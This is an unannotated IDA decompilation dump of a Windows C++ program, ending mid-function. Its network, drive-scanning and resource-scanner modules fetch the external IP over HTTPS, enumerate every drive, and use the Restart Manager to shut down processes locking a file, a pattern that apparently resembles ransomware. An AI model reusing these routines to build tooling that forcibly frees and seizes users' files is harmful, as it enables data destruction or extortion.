// 4B1664: using guessed type int (__stdcall *___7___Func_impl_no_alloc_V_lambda_1___1_____0V___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___std______Task_async_state_X_std__QAE___QAV___Fake_no_copy_callable_adapter_P8ANFileSystemScannerModule__AEX__QAUANIEvent___ZPAV1_UANEventScanFileSystem___3__Z_X__V_std__6B_[2])(int);

//----- (00418E70) --------------------------------------------------------
_DWORD *__thiscall sub_418E70(_DWORD *Block, char a2)
{
  *Block = &ANNetworkModule::`vftable';
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B16EC: using guessed type void *ANNetworkModule::`vftable';

//----- (00418EA0) --------------------------------------------------------
int __thiscall sub_418EA0(int *this)
{
  int result; // eax
  char v2; // [esp+7h] [ebp-39h]
  int v3[2]; // [esp+8h] [ebp-38h] BYREF
  char v4; // [esp+10h] [ebp-30h]
  int *v5; // [esp+14h] [ebp-2Ch]
  int *v6; // [esp+2Ch] [ebp-14h]
  int v7; // [esp+3Ch] [ebp-4h]

  v4 = v2;
  v3[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v3[1] = (int)sub_419390;
  v5 = this;
  v6 = v3;
  v7 = 0;
  result = sub_40FA20(this, 35, (int)v3);
  if ( v6 )
    return (*(int (__stdcall **)(bool))(*v6 + 16))(v6 != v3);
  return result;
}
// 418ECB: variable 'v2' is possibly undefined
// 4B1700: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00418F30) --------------------------------------------------------
int __stdcall sub_418F30(int a1, int a2)
{
  int result; // eax
  const WCHAR *v3; // edi
  int v4; // eax
  void *v5; // edi
  void *v6; // ecx
  const WCHAR *v7; // eax
  DWORD v8; // edi
  int v9; // eax
  const WCHAR *v10; // edx
  const WCHAR *v11; // ecx
  const WCHAR *v12; // eax
  void *v13; // edi
  void *v14; // ecx
  DWORD v15; // eax
  BOOL v16; // eax
  _DWORD *v17; // esi
  unsigned int v18; // kr00_4
  char *v19; // esi
  void **v20; // eax
  void *v21; // ecx
  void (__stdcall *v22)(HINTERNET); // esi
  __int128 v23; // xmm0
  void *v24[5]; // [esp+Ch] [ebp-488h] BYREF
  unsigned int v25; // [esp+20h] [ebp-474h]
  void *Block[5]; // [esp+24h] [ebp-470h] BYREF
  unsigned int v27; // [esp+38h] [ebp-45Ch]
  void **v28; // [esp+3Ch] [ebp-458h]
  void *Src[4]; // [esp+40h] [ebp-454h] BYREF
  int v30; // [esp+50h] [ebp-444h]
  unsigned int v31; // [esp+54h] [ebp-440h]
  HINTERNET hFile; // [esp+58h] [ebp-43Ch]
  void *v33; // [esp+5Ch] [ebp-438h]
  int v34; // [esp+60h] [ebp-434h]
  DWORD dwAccessType; // [esp+64h] [ebp-430h]
  __int128 v36; // [esp+68h] [ebp-42Ch] BYREF
  __int64 v37; // [esp+78h] [ebp-41Ch]
  DWORD dwNumberOfBytesRead; // [esp+80h] [ebp-414h] BYREF
  char Buffer[1024]; // [esp+84h] [ebp-410h] BYREF
  int v40; // [esp+490h] [ebp-4h]
  int savedregs; // [esp+494h] [ebp+0h] BYREF

  result = a1;
  v34 = a1;
  v33 = (void *)a1;
  v37 = 0x700000000i64;
  LOWORD(v36) = 0;
  v40 = 0;
  if ( *(_DWORD *)(a2 + 24) && *(_WORD *)(a2 + 32) && *(_DWORD *)(a2 + 52) && *(_DWORD *)(a2 + 76) )
  {
    v3 = *(const WCHAR **)(a2 + 4);
    dwAccessType = *(_DWORD *)a2;
    v4 = sub_40C780(&dword_4FA000, (int)Block, (int)&savedregs);
    if ( *(_DWORD *)(v4 + 20) >= 8u )
      v4 = *(_DWORD *)v4;
    v5 = InternetOpenW((LPCWSTR)v4, dwAccessType, v3, 0, 0);
    v33 = v5;
    if ( v27 >= 8 )
    {
      v6 = Block[0];
      if ( 2 * v27 + 2 >= 0x1000 )
      {
        v6 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v6 - 4) > 0x1F )
LABEL_50:
          _invalid_parameter_noinfo_noreturn();
      }
      sub_44775B(v6);
    }
    Block[4] = 0;
    v27 = 7;
    LOWORD(Block[0]) = 0;
    if ( v5 )
    {
      v7 = (const WCHAR *)(a2 + 8);
      if ( *(_DWORD *)(a2 + 28) >= 8u )
        v7 = *(const WCHAR **)v7;
      dwAccessType = (DWORD)InternetConnectW(v5, v7, *(_WORD *)(a2 + 32), 0, 0, 3u, 0x400000u, 1u);
      if ( dwAccessType )
      {
        v8 = *(_DWORD *)(a2 + 108);
        v9 = sub_40C780(&dword_4F9CD0, (int)v24, (int)&savedregs);
        v10 = (const WCHAR *)v9;
        if ( *(_DWORD *)(v9 + 20) >= 8u )
          v10 = *(const WCHAR **)v9;
        v11 = (const WCHAR *)(a2 + 60);
        if ( *(_DWORD *)(a2 + 80) >= 8u )
          v11 = *(const WCHAR **)v11;
        v12 = (const WCHAR *)(a2 + 36);
        if ( *(_DWORD *)(a2 + 56) >= 8u )
          v12 = *(const WCHAR **)v12;
        v13 = HttpOpenRequestW((HINTERNET)dwAccessType, v12, v11, v10, 0, 0, v8, 1u);
        hFile = v13;
        if ( v25 >= 8 )
        {
          v14 = v24[0];
          if ( 2 * v25 + 2 >= 0x1000 )
          {
            v14 = (void *)*((_DWORD *)v24[0] - 1);
            if ( (unsigned int)(v24[0] - v14 - 4) > 0x1F )
              _invalid_parameter_noinfo_noreturn();
          }
          sub_44775B(v14);
        }
        v24[4] = 0;
        v25 = 7;
        LOWORD(v24[0]) = 0;
        if ( v13 )
        {
          v15 = *(_DWORD *)(a2 + 100);
          if ( v15 )
          {
            v17 = (_DWORD *)(a2 + 84);
            if ( *(_DWORD *)(a2 + 104) >= 0x10u )
              v17 = (_DWORD *)*v17;
            v16 = HttpSendRequestA(v13, 0, 0, v17, v15);
          }
          else
          {
            v16 = HttpSendRequestW(v13, 0, 0, 0, 0);
          }
          if ( v16 )
          {
            memset(Buffer, 0, sizeof(Buffer));
            dwNumberOfBytesRead = 0;
            if ( InternetReadFile(v13, Buffer, 0x3FFu, &dwNumberOfBytesRead) )
            {
              while ( dwNumberOfBytesRead )
              {
                if ( dwNumberOfBytesRead >= 0x400 )
                  __report_rangecheckfailure();
                Buffer[dwNumberOfBytesRead] = 0;
                v18 = strlen(Buffer);
                v30 = 0;
                v31 = 7;
                LOWORD(Src[0]) = 0;
                sub_40AF10(Src, v18);
                v19 = Buffer;
                v28 = Src;
                for ( LOBYTE(v40) = 1; v19 != &Buffer[v18]; ++v19 )
                  sub_40E8C0((int *)Src, *v19);
                LOBYTE(v40) = 2;
                v20 = Src;
                if ( v31 >= 8 )
                  v20 = (void **)Src[0];
                sub_4044A0(&v36, v20, v30);
                LOBYTE(v40) = 0;
                if ( v31 >= 8 )
                {
                  v21 = Src[0];
                  if ( 2 * v31 + 2 >= 0x1000 )
                  {
                    v21 = (void *)*((_DWORD *)Src[0] - 1);
                    if ( (unsigned int)(Src[0] - v21 - 4) > 0x1F )
                      goto LABEL_50;
                  }
                  sub_44775B(v21);
                }
                v13 = hFile;
                dwNumberOfBytesRead = 0;
                if ( !InternetReadFile(hFile, Buffer, 0x3FFu, &dwNumberOfBytesRead) )
                  break;
              }
            }
          }
          v22 = (void (__stdcall *)(HINTERNET))InternetCloseHandle;
          InternetCloseHandle(v13);
        }
        else
        {
          v22 = (void (__stdcall *)(HINTERNET))InternetCloseHandle;
        }
        v22((HINTERNET)dwAccessType);
        v5 = v33;
      }
      InternetCloseHandle(v5);
    }
    result = v34;
  }
  v23 = v36;
  *(_DWORD *)(result + 16) = 0;
  *(_DWORD *)(result + 20) = 0;
  *(_OWORD *)result = v23;
  *(_QWORD *)(result + 16) = v37;
  return result;
}
// 4478AD: using guessed type void __noreturn __report_rangecheckfailure(void);
// 418F30: using guessed type char Buffer[1024];

//----- (00419390) --------------------------------------------------------
int __stdcall sub_419390(void *a1)
{
  int v1; // esi
  void *v2; // ecx
  void *v3; // ecx
  int v4; // esi
  void *v5; // ecx
  void *v6; // ecx
  unsigned __int16 *v7; // eax
  void **v8; // ecx
  char *v9; // edi
  void **v10; // esi
  int v11; // eax
  char *v12; // ecx
  unsigned int v13; // eax
  unsigned __int16 *v14; // edx
  void **v15; // ecx
  unsigned int v16; // esi
  int v17; // edx
  unsigned int v18; // edx
  void **v19; // eax
  unsigned int v20; // esi
  void *v21; // ecx
  char *v22; // eax
  char *v23; // eax
  void *v24; // esi
  int v26; // [esp+Ch] [ebp-E8h]
  unsigned int v27; // [esp+10h] [ebp-E4h]
  void *v28[5]; // [esp+14h] [ebp-E0h] BYREF
  unsigned int v29; // [esp+28h] [ebp-CCh]
  int v30[2]; // [esp+2Ch] [ebp-C8h] BYREF
  void *Block[4]; // [esp+34h] [ebp-C0h] BYREF
  __int64 v32; // [esp+44h] [ebp-B0h]
  __int16 v33; // [esp+4Ch] [ebp-A8h]
  void *v34[4]; // [esp+50h] [ebp-A4h] BYREF
  __int64 v35; // [esp+60h] [ebp-94h]
  _DWORD v36[6]; // [esp+68h] [ebp-8Ch] BYREF
  char v37; // [esp+80h] [ebp-74h]
  int v38; // [esp+90h] [ebp-64h]
  int v39; // [esp+94h] [ebp-60h]
  int v40; // [esp+98h] [ebp-5Ch]
  void *v41[4]; // [esp+9Ch] [ebp-58h] BYREF
  unsigned int v42; // [esp+ACh] [ebp-48h]
  unsigned int v43; // [esp+B0h] [ebp-44h]
  void *v44[4]; // [esp+B4h] [ebp-40h] BYREF
  unsigned int v45; // [esp+C4h] [ebp-30h]
  unsigned int v46; // [esp+C8h] [ebp-2Ch]
  void *v47[4]; // [esp+CCh] [ebp-28h] BYREF
  unsigned int v48; // [esp+DCh] [ebp-18h]
  unsigned int v49; // [esp+E0h] [ebp-14h]
  int v50; // [esp+F0h] [ebp-4h]
  int savedregs; // [esp+F4h] [ebp+0h] BYREF

  v26 = sub_4199E0(a1);
  v30[0] = 0;
  v30[1] = 0;
  v32 = 0x700000000i64;
  LOWORD(Block[0]) = 0;
  v33 = 0;
  v35 = 0x700000000i64;
  LOWORD(v34[0]) = 0;
  v36[4] = 0;
  v36[5] = 7;
  LOWORD(v36[0]) = 0;
  v38 = 0;
  v39 = 15;
  v37 = 0;
  v50 = 0;
  v1 = sub_40C780(&dword_4F9EE0, (int)v28, (int)&savedregs);
  if ( Block != (void **)v1 )
  {
    if ( HIDWORD(v32) >= 8 )
    {
      v2 = Block[0];
      if ( (unsigned int)(2 * HIDWORD(v32) + 2) >= 0x1000 )
      {
        v2 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v2 - 4) > 0x1F )
          goto LABEL_55;
      }
      sub_44775B(v2);
    }
    v32 = 0x700000000i64;
    LOWORD(Block[0]) = 0;
    *(_OWORD *)Block = *(_OWORD *)v1;
    v32 = *(_QWORD *)(v1 + 16);
    *(_DWORD *)(v1 + 16) = 0;
    *(_DWORD *)(v1 + 20) = 7;
    *(_WORD *)v1 = 0;
  }
  if ( v29 < 8 )
    goto LABEL_11;
  v3 = v28[0];
  if ( 2 * v29 + 2 >= 0x1000 )
  {
    v3 = (void *)*((_DWORD *)v28[0] - 1);
    if ( (unsigned int)(v28[0] - v3 - 4) > 0x1F )
LABEL_55:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v3);
LABEL_11:
  v33 = 443;
  v4 = sub_40C780(&dword_4F9F28, (int)v28, (int)&savedregs);
  if ( v34 != (void **)v4 )
  {
    if ( HIDWORD(v35) >= 8 )
    {
      v5 = v34[0];
      if ( (unsigned int)(2 * HIDWORD(v35) + 2) >= 0x1000 )
      {
        v5 = (void *)*((_DWORD *)v34[0] - 1);
        if ( (unsigned int)(v34[0] - v5 - 4) > 0x1F )
          goto LABEL_56;
      }
      sub_44775B(v5);
    }
    v35 = 0x700000000i64;
    LOWORD(v34[0]) = 0;
    *(_OWORD *)v34 = *(_OWORD *)v4;
    v35 = *(_QWORD *)(v4 + 16);
    *(_DWORD *)(v4 + 16) = 0;
    *(_DWORD *)(v4 + 20) = 7;
    *(_WORD *)v4 = 0;
  }
  if ( v29 < 8 )
    goto LABEL_21;
  v6 = v28[0];
  if ( 2 * v29 + 2 >= 0x1000 )
  {
    v6 = (void *)*((_DWORD *)v28[0] - 1);
    if ( (unsigned int)(v28[0] - v6 - 4) > 0x1F )
LABEL_56:
      _invalid_parameter_noinfo_noreturn();
  }
  sub_44775B(v6);
LABEL_21:
  sub_404330(v36, (void *)L"/", 1u);
  v40 = 0x800000;
  sub_418F30((int)v47, (int)v30);
  LOBYTE(v50) = 1;
  if ( v48 )
  {
    v42 = 0;
    v43 = 7;
    LOWORD(v41[0]) = 0;
    sub_404330(v41, L"\"ip\":\"", 6u);
    LOBYTE(v50) = 2;
    v45 = 0;
    v46 = 7;
    LOWORD(v44[0]) = 0;
    sub_404330(v44, L"\",", 2u);
    LOBYTE(v50) = 3;
    v7 = (unsigned __int16 *)v41;
    v8 = v47;
    v9 = (char *)v41[0];
    if ( v43 >= 8 )
      v7 = (unsigned __int16 *)v41[0];
    v10 = (void **)v47[0];
    if ( v49 >= 8 )
      v8 = (void **)v47[0];
    v11 = sub_40AB20((int)v8, v48, 0, v7, v42);
    v12 = (char *)v44[0];
    if ( v11 != -1 )
    {
      v13 = v42 + v11;
      v14 = (unsigned __int16 *)v44;
      if ( v46 >= 8 )
        v14 = (unsigned __int16 *)v44[0];
      v27 = v13;
      v15 = v47;
      if ( v49 >= 8 )
        v15 = v10;
      v16 = v48;
      v17 = sub_40AB20((int)v15, v48, v13, v14, v45);
      if ( v17 != -1 )
      {
        v28[4] = 0;
        v29 = 7;
        LOWORD(v28[0]) = 0;
        if ( v16 < v27 )
          sub_404630();
        v18 = v17 - v27;
        v19 = v47;
        v20 = v16 - v27;
        if ( v20 < v18 )
          v18 = v20;
        if ( v49 >= 8 )
          v19 = (void **)v47[0];
        sub_404330(v28, (char *)v19 + 2 * v27, v18);
        sub_405520((_DWORD *)(v26 + 16), v28);
        if ( v29 >= 8 )
        {
          v21 = v28[0];
          if ( 2 * v29 + 2 >= 0x1000 )
          {
            v21 = (void *)*((_DWORD *)v28[0] - 1);
            if ( (unsigned int)(v28[0] - v21 - 4) > 0x1F )
              goto LABEL_58;
          }
          sub_44775B(v21);
        }
      }
      v12 = (char *)v44[0];
    }
    if ( v46 >= 8 )
    {
      v22 = v12;
      if ( 2 * v46 + 2 >= 0x1000 )
      {
        v12 = (char *)*((_DWORD *)v12 - 1);
        if ( (unsigned int)(v22 - v12 - 4) > 0x1F )
          goto LABEL_58;
      }
      sub_44775B(v12);
    }
    if ( v43 >= 8 )
    {
      v23 = v9;
      if ( 2 * v43 + 2 >= 0x1000 )
      {
        v9 = (char *)*((_DWORD *)v9 - 1);
        if ( (unsigned int)(v23 - v9 - 4) > 0x1F )
          goto LABEL_58;
      }
      sub_44775B(v9);
    }
  }
  if ( v49 >= 8 )
  {
    v24 = v47[0];
    if ( 2 * v49 + 2 < 0x1000 || (v24 = (void *)*((_DWORD *)v47[0] - 1), (unsigned int)(v47[0] - v24 - 4) <= 0x1F) )
    {
      sub_44775B(v24);
      goto LABEL_54;
    }
LABEL_58:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_54:
  v48 = 0;
  v49 = 7;
  LOWORD(v47[0]) = 0;
  return sub_4198A0(v30);
}
// 404630: using guessed type void __noreturn sub_404630(void);
// 4B16D0: using guessed type wchar_t aIp[7];
// 4B16E0: using guessed type wchar_t asc_4B16E0[3];

//----- (004198A0) --------------------------------------------------------
int __thiscall sub_4198A0(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax
  unsigned int v4; // ecx
  _DWORD *v5; // eax
  unsigned int v6; // ecx
  _DWORD *v7; // eax
  unsigned int v8; // ecx
  void *v9; // eax
  int result; // eax

  v2 = this[26];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)this[21];
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        goto LABEL_22;
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_44775B(v3);
  }
  this[25] = 0;
  this[26] = 15;
  *((_BYTE *)this + 84) = 0;
  v4 = this[20];
  if ( v4 >= 8 )
  {
    v5 = (_DWORD *)this[15];
    if ( 2 * v4 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v5 - *(v5 - 1) - 4 > 0x1F )
        goto LABEL_22;
      v5 = (_DWORD *)*(v5 - 1);
    }
    sub_44775B(v5);
  }
  this[19] = 0;
  this[20] = 7;
  *((_WORD *)this + 30) = 0;
  v6 = this[14];
  if ( v6 >= 8 )
  {
    v7 = (_DWORD *)this[9];
    if ( 2 * v6 + 2 >= 0x1000 )
    {
      if ( (unsigned int)v7 - *(v7 - 1) - 4 > 0x1F )
        goto LABEL_22;
      v7 = (_DWORD *)*(v7 - 1);
    }
    sub_44775B(v7);
  }
  this[13] = 0;
  this[14] = 7;
  *((_WORD *)this + 18) = 0;
  v8 = this[7];
  if ( v8 >= 8 )
  {
    v9 = (void *)this[2];
    if ( 2 * v8 + 2 < 0x1000 )
    {
LABEL_20:
      sub_44775B(v9);
      goto LABEL_21;
    }
    if ( (unsigned int)v9 - *((_DWORD *)v9 - 1) - 4 <= 0x1F )
    {
      v9 = (void *)*((_DWORD *)v9 - 1);
      goto LABEL_20;
    }
LABEL_22:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_21:
  result = 0;
  this[6] = 0;
  this[7] = 7;
  *((_WORD *)this + 4) = 0;
  return result;
}

//----- (004199E0) --------------------------------------------------------
int __thiscall sub_4199E0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast(
           (int)this,
           0,
           &ANIEvent `RTTI Type Descriptor',
           &ANEventGetExternalIP `RTTI Type Descriptor',
           1);
}

//----- (00419A60) --------------------------------------------------------
void ***sub_419A60()
{
  return &std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &> `RTTI Type Descriptor';
}
// 4FF050: using guessed type void **std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &> `RTTI Type Descriptor';

//----- (00419A70) --------------------------------------------------------
int __thiscall sub_419A70(int this, int a2)
{
  int result; // eax

  result = a2;
  *(_DWORD *)a2 = &std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  *(_DWORD *)(a2 + 4) = *(_DWORD *)(this + 4);
  *(_BYTE *)(a2 + 8) = *(_BYTE *)(this + 8);
  *(_DWORD *)(a2 + 12) = *(_DWORD *)(this + 12);
  return result;
}
// 4B1700: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANNetworkModule::*)(ANIEvent &&),ANNetworkModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00419AA0) --------------------------------------------------------
char *__thiscall sub_419AA0(char *Block, char a2)
{
  *(_DWORD *)Block = &ANResourceScannerModule::`vftable';
  _Mtx_destroy_in_situ((_Mtx_t)(Block + 28));
  sub_40F840(Block);
  if ( (a2 & 1) != 0 )
    sub_44775B(Block);
  return Block;
}
// 4B1738: using guessed type void *ANResourceScannerModule::`vftable';

//----- (00419AF0) --------------------------------------------------------
int __thiscall sub_419AF0(int *this)
{
  int result; // eax
  int v3[2]; // [esp+8h] [ebp-48h] BYREF
  int *v4; // [esp+10h] [ebp-40h]
  char v5; // [esp+17h] [ebp-39h]
  int v6[2]; // [esp+18h] [ebp-38h] BYREF
  char v7; // [esp+20h] [ebp-30h]
  int *v8; // [esp+24h] [ebp-2Ch]
  int *v9; // [esp+3Ch] [ebp-14h]
  int v10; // [esp+4Ch] [ebp-4h]

  v7 = v5;
  v6[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v6[1] = (int)sub_419BF0;
  v8 = this;
  v9 = v6;
  v10 = 0;
  sub_40FA20(this, 2, (int)v6);
  v3[0] = (int)sub_419DF0;
  v4 = this;
  sub_41A080(v6, (int)v3);
  sub_40FA20(this, 3, (int)v6);
  v3[0] = (int)sub_419E80;
  v4 = this;
  sub_41A080(v6, (int)v3);
  sub_40FA20(this, 30, (int)v6);
  v3[0] = (int)sub_419EA0;
  v4 = this;
  sub_41A080(v6, (int)v3);
  result = sub_40FA20(this, 31, (int)v6);
  if ( v9 )
    return (*(int (__stdcall **)(bool))(*v9 + 16))(v9 != v6);
  return result;
}
// 4B171C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (00419BF0) --------------------------------------------------------
void __stdcall sub_419BF0(void *a1)
{
  unsigned int i; // esi
  int v2; // eax
  unsigned int v3; // eax
  void *v4; // ecx
  char *v5; // esi
  char *v6; // eax
  __int128 v7; // xmm0
  int v8; // [esp+Ch] [ebp-40h]
  DWORD LogicalDrives; // [esp+10h] [ebp-3Ch]
  __int16 v10; // [esp+14h] [ebp-38h] BYREF
  _BYTE Block[24]; // [esp+18h] [ebp-34h] BYREF
  __int64 v12; // [esp+30h] [ebp-1Ch] BYREF
  int v13; // [esp+38h] [ebp-14h]
  int v14; // [esp+48h] [ebp-4h]
  int savedregs; // [esp+4Ch] [ebp+0h] BYREF

  v8 = sub_41A0E0(a1);
  v12 = 0i64;
  v13 = 0;
  v14 = 0;
  LogicalDrives = GetLogicalDrives();
  for ( i = 0; i < 0x1A; ++i )
  {
    sub_403DF0((int)&savedregs, (int)Block, i + 65);
    LOBYTE(v14) = 1;
    if ( *(_DWORD *)&Block[16] )
    {
      v2 = HIDWORD(v12);
      if ( HIDWORD(v12) == v13 )
        goto LABEL_4;
    }
    else
    {
      if ( ((1 << i) & LogicalDrives) == 0 )
        goto LABEL_5;
      v10 = i + 65;
      sub_404330(Block, &v10, 1u);
      sub_4044A0(Block, L":\\", 2u);
      v2 = HIDWORD(v12);
      if ( HIDWORD(v12) == v13 )
      {
LABEL_4:
        sub_404640((int *)&v12, v2, (int)Block);
LABEL_5:
        v3 = *(_DWORD *)&Block[20];
        goto LABEL_6;
      }
    }
    v7 = *(_OWORD *)Block;
    *(_DWORD *)(v2 + 16) = 0;
    *(_WORD *)Block = 0;
    *(_OWORD *)v2 = v7;
    *(_QWORD *)(v2 + 16) = *(_QWORD *)&Block[16];
    v3 = 7;
    HIDWORD(v12) += 24;
LABEL_6:
    LOBYTE(v14) = 0;
    if ( v3 >= 8 )
    {
      v4 = *(void **)Block;
      if ( 2 * v3 + 2 >= 0x1000 )
      {
        v4 = *(void **)(*(_DWORD *)Block - 4);
        if ( (unsigned int)(*(_DWORD *)Block - (_DWORD)v4 - 4) > 0x1F )
          goto LABEL_20;
      }
      sub_44775B(v4);
    }
  }
  *(_DWORD *)&Block[20] = v13;
  *(_QWORD *)&Block[12] = v12;
  sub_419FD0((int *)(v8 + 16), (int *)&Block[12]);
  v5 = *(char **)&Block[12];
  if ( *(_DWORD *)&Block[12] )
  {
    sub_4047B0(*(int *)&Block[12], *(int *)&Block[16]);
    v6 = v5;
    if ( (unsigned int)(24 * ((*(_DWORD *)&Block[20] - (int)v5) / 24)) >= 0x1000 )
    {
      v5 = (char *)*((_DWORD *)v5 - 1);
      if ( (unsigned int)(v6 - v5 - 4) > 0x1F )
LABEL_20:
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v5);
  }
}
// 49DC78: using guessed type wchar_t asc_49DC78[3];

//----- (00419DF0) --------------------------------------------------------
void __thiscall sub_419DF0(int this, void *a2)
{
  int v3; // esi
  int *v4; // eax
  void *v5; // esi
  void *Block[3]; // [esp+8h] [ebp-Ch] BYREF

  v3 = sub_41A160(a2);
  v4 = sub_4080B0((void *)(this + 28), Block);
  sub_419FD0((int *)(v3 + 16), v4);
  if ( Block[0] )
  {
    sub_4047B0((int)Block[0], (int)Block[1]);
    v5 = Block[0];
    if ( (unsigned int)(24 * ((Block[2] - Block[0]) / 24)) >= 0x1000 )
    {
      v5 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v5);
  }
}

//----- (00419E80) --------------------------------------------------------
char __stdcall sub_419E80(void *a1)
{
  sub_41A1E0(a1);
  return sub_404AF0();
}

//----- (00419EA0) --------------------------------------------------------
DWORD __stdcall sub_419EA0(void *a1)
{
  DWORD result; // eax
  DWORD v2; // esi
  unsigned int v3; // edi
  RM_PROCESS_INFO *v4; // esi
  UINT v5; // eax
  int v6; // eax
  unsigned int v7; // ecx
  LPCWSTR rgsFileNames; // [esp+4h] [ebp-5Ch] BYREF
  UINT pnProcInfo; // [esp+8h] [ebp-58h] BYREF
  DWORD dwRebootReasons; // [esp+Ch] [ebp-54h] BYREF
  UINT pnProcInfoNeeded; // [esp+10h] [ebp-50h] BYREF
  DWORD pSessionHandle; // [esp+14h] [ebp-4Ch] BYREF
  WCHAR v13[34]; // [esp+18h] [ebp-48h] BYREF

  result = sub_41A260(a1);
  v2 = result + 16;
  if ( *(_DWORD *)(result + 32) )
  {
    pSessionHandle = -1;
    memset(v13, 0, 0x42u);
    result = RmStartSession(&pSessionHandle, 0, v13);
    if ( !result )
    {
      if ( *(_DWORD *)(v2 + 20) >= 8u )
        v2 = *(_DWORD *)v2;
      rgsFileNames = (LPCWSTR)v2;
      result = RmRegisterResources(pSessionHandle, 1u, &rgsFileNames, 0, 0, 0, 0);
      if ( !result )
      {
        v3 = 0;
        v4 = 0;
        pnProcInfo = 0;
        pnProcInfoNeeded = 0;
        dwRebootReasons = 0;
        while ( 1 )
        {
          result = RmGetList(pSessionHandle, &pnProcInfoNeeded, &pnProcInfo, v4, &dwRebootReasons);
          if ( !result )
            break;
          if ( result != 234 )
            return result;
          v5 = pnProcInfoNeeded;
          pnProcInfo = pnProcInfoNeeded;
          if ( v4 )
          {
            j_j__free(v4);
            v5 = pnProcInfo;
          }
          v6 = unknown_libname_86((668 * (unsigned __int64)v5) >> 32 != 0 ? -1 : 668 * v5);
          v7 = v3++;
          v4 = (RM_PROCESS_INFO *)v6;
          if ( v7 >= 3 )
            goto LABEL_15;
        }
        if ( !dwRebootReasons )
          RmShutdown(pSessionHandle, 0, 0);
LABEL_15:
        if ( v4 )
          j_j__free(v4);
        result = pSessionHandle;
        if ( pSessionHandle != -1 )
          return RmEndSession(pSessionHandle);
      }
    }
  }
  return result;
}
// 447DE6: using guessed type int __cdecl unknown_libname_86(_DWORD);
// 419EA0: using guessed type WCHAR var_48[34];

//----- (00419FD0) --------------------------------------------------------
int *__thiscall sub_419FD0(int *this, int *a2)
{
  int v3; // ecx
  _DWORD *v4; // ebx

  if ( this != a2 )
  {
    v3 = *this;
    if ( *this )
    {
      sub_4047B0(v3, this[1]);
      v4 = (_DWORD *)*this;
      if ( (unsigned int)(24 * ((this[2] - *this) / 24)) >= 0x1000 )
      {
        if ( (unsigned int)v4 - *(v4 - 1) - 4 > 0x1F )
          _invalid_parameter_noinfo_noreturn();
        v4 = (_DWORD *)*(v4 - 1);
      }
      sub_44775B(v4);
      *this = 0;
      this[1] = 0;
      this[2] = 0;
    }
    *this = *a2;
    this[1] = a2[1];
    this[2] = a2[2];
    *a2 = 0;
    a2[1] = 0;
    a2[2] = 0;
  }
  return this;
}

//----- (0041A080) --------------------------------------------------------
void *__thiscall sub_41A080(void *this, int a2)
{
  int v4[2]; // [esp+8h] [ebp-28h] BYREF
  char v5; // [esp+10h] [ebp-20h]
  int v6; // [esp+14h] [ebp-1Ch]
  int *v7; // [esp+2Ch] [ebp-4h]

  v4[0] = (int)&std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';
  v4[1] = *(_DWORD *)a2;
  v5 = *(_BYTE *)(a2 + 4);
  v6 = *(_DWORD *)(a2 + 8);
  v7 = v4;
  sub_412DF0(v4, (int)this);
  if ( v7 )
    (*(void (__stdcall **)(bool))(*v7 + 16))(v7 != v4);
  return this;
}
// 4B171C: using guessed type void *std::_Func_impl_no_alloc<std::_Binder<std::_Unforced,void (__thiscall ANResourceScannerModule::*)(ANIEvent &&),ANResourceScannerModule *,std::_Ph<1> const &>,void,ANIEvent &&>::`vftable';

//----- (0041A0E0) --------------------------------------------------------
int __thiscall sub_41A0E0(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
  v2[10] = 0;
  return __RTDynamicCast((int)this, 0, &ANIEvent `RTTI Type Descriptor', &ANEventDriveScan `RTTI Type Descriptor', 1);
}

//----- (0041A160) --------------------------------------------------------
int __thiscall sub_41A160(void *this)
{
  _DWORD v2[11]; // [esp+0h] [ebp-2Ch] BYREF

  v2[7] = v2;
